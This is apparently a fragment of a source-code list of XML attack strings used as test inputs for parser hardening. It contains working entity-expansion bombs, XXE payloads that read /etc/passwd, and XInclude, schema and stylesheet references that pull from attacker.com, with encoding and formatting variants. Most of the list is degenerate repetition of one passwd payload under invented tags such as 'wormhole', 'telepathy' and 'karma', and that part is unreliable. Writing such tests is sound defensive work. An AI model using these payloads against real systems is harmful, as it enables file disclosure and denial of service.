            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><root>&lol9;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "xxxxxxx"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">]><root>&f;</root>',
            

            '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
            '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker.com/xxe.dtd" parse="text"/></root>',
            

            '<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:redefine schemaLocation="http://attacker.com/xxe.dtd"/></xs:schema>',
            

            '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://attacker.com/xxe.xsl"?><root/>',
            '<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:include href="http://attacker.com/xxe.dtd"/></xsl:stylesheet>',
            

            '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!ENTITY test SYSTEM "file:///etc/passwd">]><svg version="1.1" xmlns="http://www.w3.org/2000/svg">&test;</svg>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><Signature xmlns="http://www.w3.org/2000/09/xmldsig#">&test;</Signature></root>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&test;</samlp:AuthnRequest>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">&test;</wsdl:definitions>',
            

            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">&test;</Relationships>',
            

            '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><manifest xmlns:android="http://schemas.android.com/apk/res/android">&test;</manifest>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist [<!ENTITY test SYSTEM "file:///etc/passwd">]><plist version="1.0">&test;</plist>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><jnlp>&test;</jnlp>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><swf>&test;</swf>',
            

            '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><Deployment>&test;</Deployment>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><package xmlns="http://www.idpf.org/2007/opf">&test;</package>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">&test;</office:document-content>',
            

            'BEGIN:VCALENDAR<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;END:VCALENDAR',
            

            'BEGIN:VCARD<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;END:VCARD',
            

            '%YAML 1.2\n---\n<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;',
            

            '{"test": "<!DOCTYPE root [<!ENTITY test SYSTEM \\"file:///etc/passwd\\">]>&test;"}',
            

            'id,name,description\n1,test,"<!DOCTYPE root [<!ENTITY test SYSTEM \\"file:///etc/passwd\\">]>&test;"',
            

            'Some text before <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test; some text after',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&#x26;&#x74;&#x65;&#x73;&#x74;;</root>',
            

            '<?xml version="1.0"?><!DoCtYpE root [<!EnTiTy test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root[<!ENTITY test SYSTEM"file:///etc/passwd">]><root>&test;</root>',
            

            '<?xml version="1.0" ?> <!DOCTYPE root [ <!ENTITY test SYSTEM "file:///etc/passwd" > ] > <root> &test; </root>',
            

            '<?xml version="1.0"?>\t<!DOCTYPE root [\t<!ENTITY test SYSTEM "file:///etc/passwd">\t]>\t<root>\t&test;\t</root>',
            

            '<?xml version="1.0"?>\n<!DOCTYPE root [\n<!ENTITY test SYSTEM "file:///etc/passwd">\n]>\n<root>\n&test;\n</root>',
            

            '<?xml version="1.0"?>\r<!DOCTYPE root [\r<!ENTITY test SYSTEM "file:///etc/passwd">\r]>\r<root>\r&test;\r</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><!DOCTYPE ignore [<!ENTITY ignore "ignore">]><root>&test;</root>',
            

            '<?xml version="1.0"?><!-- <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">] --><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!-- <!ENTITY test SYSTEM "file:///etc/passwd"> -->]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<![CDATA[<!ENTITY test SYSTEM "file:///etc/passwd">]]>]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<?ignore <!ENTITY test SYSTEM "file:///etc/passwd">?>]><root>&test;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd" >]><root>&test </root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd"> ]><root>&test</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&#116;&#101;&#115;&#116;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&#x74;&#x65;&#x73;&#x74;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % x25 "&#x25;"><!ENTITY % x64 "&#x64;"><!ENTITY % x61 "&#x61;"><!ENTITY % x74 "&#x74;"><!ENTITY % x61 "&#x61;"><!ENTITY % x20 "&#x20;"><!ENTITY % x53 "&#x53;"><!ENTITY % x59 "&#x59;"><!ENTITY % x53 "&#x53;"><!ENTITY % x54 "&#x54;"><!ENTITY % x45 "&#x45;"><!ENTITY % x4d "&#x4d;"><!ENTITY % x20 "&#x20;"><!ENTITY % x66 "&#x66;"><!ENTITY % x69 "&#x69;"><!ENTITY % x6c "&#x6c;"><!ENTITY % x65 "&#x65;"><!ENTITY % x3a "&#x3a;"><!ENTITY % x2f "&#x2f;"><!ENTITY % x2f "&#x2f;"><!ENTITY % x65 "&#x65;"><!ENTITY % x74 "&#x74;"><!ENTITY % x63 "&#x63;"><!ENTITY % x2f "&#x2f;"><!ENTITY % x70 "&#x70;"><!ENTITY % x61 "&#x61;"><!ENTITY % x73 "&#x73;"><!ENTITY % x73 "&#x73;"><!ENTITY % x77 "&#x77;"><!ENTITY % x64 "&#x64;">]><root/>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % x25 "%"><!ENTITY % x64 "d"><!ENTITY % x61 "a"><!ENTITY % x74 "t"><!ENTITY % x61 "a"><!ENTITY % x20 " "><!ENTITY % x53 "S"><!ENTITY % x59 "Y"><!ENTITY % x53 "S"><!ENTITY % x54 "T"><!ENTITY % x45 "E"><!ENTITY % x4d "M"><!ENTITY % x20 " "><!ENTITY % x66 "f"><!ENTITY % x69 "i"><!ENTITY % x6c "l"><!ENTITY % x65 "e"><!ENTITY % x3a ":"><!ENTITY % x2f "/"><!ENTITY % x2f "/"><!ENTITY % x65 "e"><!ENTITY % x74 "t"><!ENTITY % x63 "c"><!ENTITY % x2f "/"><!ENTITY % x70 "p"><!ENTITY % x61 "a"><!ENTITY % x73 "s"><!ENTITY % x73 "s"><!ENTITY % x77 "w"><!ENTITY % x64 "d">]><root/>',
            

            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&#x74;&#x65;&#x73;&#x74;</root>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><methodCall><methodName>&test;</methodName></methodCall>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ajax-response>&test;</ajax-response>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><api><data>&test;</data></api>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><graphql><query>&test;</query></graphql>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><service><request>&test;</request></service>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><device><config>&test;</config></device>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><plc><program>&test;</program></plc>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ecu><firmware>&test;</firmware></ecu>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><medical><patient>&test;</patient></medical>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><avionics><system>&test;</system></avionics>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><military><classified>&test;</classified></military>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><government><document>&test;</document></government>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><financial><transaction>&test;</transaction></financial>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><healthcare><record>&test;</record></healthcare>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><education><student>&test;</student></education>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><retail><product>&test;</product></retail>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><hospitality><guest>&test;</guest></hospitality>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><transportation><vehicle>&test;</vehicle></transportation>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><energy><grid>&test;</grid></energy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><telecom><network>&test;</network></telecom>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><media><content>&test;</content></media>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><gaming><player>&test;</player></gaming>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><social><post>&test;</post></social>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ecommerce><order>&test;</order></ecommerce>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><crypto><wallet>&test;</wallet></crypto>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><blockchain><transaction>&test;</transaction></blockchain>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ai><model>&test;</model></ai>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><cloud><instance>&test;</instance></cloud>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><container><image>&test;</image></container>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><kubernetes><pod>&test;</pod></kubernetes>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><serverless><function>&test;</function></serverless>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><edge><device>&test;</device></edge>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><network5g><slice>&test;</slice></network5g>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><quantum><qubit>&test;</qubit></quantum>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><space><satellite>&test;</satellite></space>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><underwater><submarine>&test;</submarine></underwater>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><underground><tunnel>&test;</tunnel></underground>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><arctic><station>&test;</station></arctic>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><desert><oasis>&test;</oasis></desert>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><jungle><camp>&test;</camp></jungle>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><mountain><peak>&test;</peak></mountain>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ocean><vessel>&test;</vessel></ocean>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><river><boat>&test;</boat></river>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><lake><fishing>&test;</fishing></lake>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><forest><trail>&test;</trail></forest>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><farm><crop>&test;</crop></farm>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ranch><livestock>&test;</livestock></ranch>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><zoo><animal>&test;</animal></zoo>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><aquarium><fish>&test;</fish></aquarium>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><museum><exhibit>&test;</exhibit></museum>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><library><book>&test;</book></library>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><archive><document>&test;</document></archive>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><database><record>&test;</record></database>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><filesystem><file>&test;</file></filesystem>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><network><packet>&test;</packet></network>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><security><alert>&test;</alert></security>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><surveillance><camera>&test;</camera></surveillance>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><accesscontrol><door>&test;</door></accesscontrol>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><alarm><sensor>&test;</sensor></alarm>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><fire><detector>&test;</detector></fire>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><flood><sensor>&test;</sensor></flood>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><earthquake><seismograph>&test;</seismograph></earthquake>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><tsunami><buoy>&test;</buoy></tsunami>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><hurricane><radar>&test;</radar></hurricane>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><tornado><siren>&test;</siren></tornado>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><volcano><monitor>&test;</monitor></volcano>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><avalanche><warning>&test;</warning></avalanche>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><blizzard><alert>&test;</alert></blizzard>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><drought><indicator>&test;</indicator></drought>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><heatwave><warning>&test;</warning></heatwave>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><coldwave><alert>&test;</alert></coldwave>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><pollution><monitor>&test;</monitor></pollution>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><radiation><detector>&test;</detector></radiation>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><chemical><sensor>&test;</sensor></chemical>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><biological><sample>&test;</sample></biological>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><nuclear><reactor>&test;</reactor></nuclear>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><solar><panel>&test;</panel></solar>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><wind><turbine>&test;</turbine></wind>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><hydro><dam>&test;</dam></hydro>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><geothermal><plant>&test;</plant></geothermal>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><tidal><generator>&test;</generator></tidal>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><wave><converter>&test;</converter></wave>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><biomass><digester>&test;</digester></biomass>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><hydrogen><fuelcell>&test;</fuelcell></hydrogen>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><fusion><reactor>&test;</reactor></fusion>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><fission><reactor>&test;</reactor></fission>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><plasma><generator>&test;</generator></plasma>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><antimatter><containment>&test;</containment></antimatter>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><darkmatter><detector>&test;</detector></darkmatter>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><darkenergy><sensor>&test;</sensor></darkenergy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><wormhole><portal>&test;</portal></wormhole>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><blackhole><singularity>&test;</singularity></blackhole>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><whitehole><exit>&test;</exit></whitehole>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><multiverse><universe>&test;</universe></multiverse>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><paralleluniverse><reality>&test;</reality></paralleluniverse>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><alternatereality><dimension>&test;</dimension></alternatereality>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><timetravel><machine>&test;</machine></timetravel>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><teleportation><device>&test;</device></teleportation>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><invisibility><cloak>&test;</cloak></invisibility>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><telekinesis><focus>&test;</focus></telekinesis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><telepathy><mind>&test;</mind></telepathy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><precognition><vision>&test;</vision></precognition>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><retrocognition><memory>&test;</memory></retrocognition>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><clairvoyance><sight>&test;</sight></clairvoyance>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><clairaudience><hearing>&test;</hearing></clairaudience>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><clairsentience><feeling>&test;</feeling></clairsentience>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><clairalience><smell>&test;</smell></clairalience>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><clairgustance><taste>&test;</taste></clairgustance>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><psychometry><object>&test;</object></psychometry>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><mediumship><spirit>&test;</spirit></mediumship>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><channeling><entity>&test;</entity></channeling>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><astralprojection><travel>&test;</travel></astralprojection>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><remoteviewing><target>&test;</target></remoteviewing>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><dreaminterpretation><dream>&test;</dream></dreaminterpretation>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><luciddreaming><control>&test;</control></luciddreaming>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><outofbodyexperience>&test;</outofbodyexperience>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><neardeathexperience>&test;</neardeathexperience>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><pastliferegression>&test;</pastliferegression>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><futurelifeprogression>&test;</futurelifeprogression>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><reincarnation>&test;</reincarnation>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><karma>&test;</karma>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><dharma>&test;</dharma>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><samsara>&test;</samsara>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><nirvana>&test;</nirvana>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><enlightenment>&test;</enlightenment>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><awakening>&test;</awakening>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><consciousness>&test;</consciousness>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><subconscious>&test;</subconscious>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><unconscious>&test;</unconscious>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><superconscious>&test;</superconscious>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><collectiveunconscious>&test;</collectiveunconscious>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><archetype>&test;</archetype>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><shadow>&test;</shadow>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><persona>&test;</persona>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><anima>&test;</anima>',
            

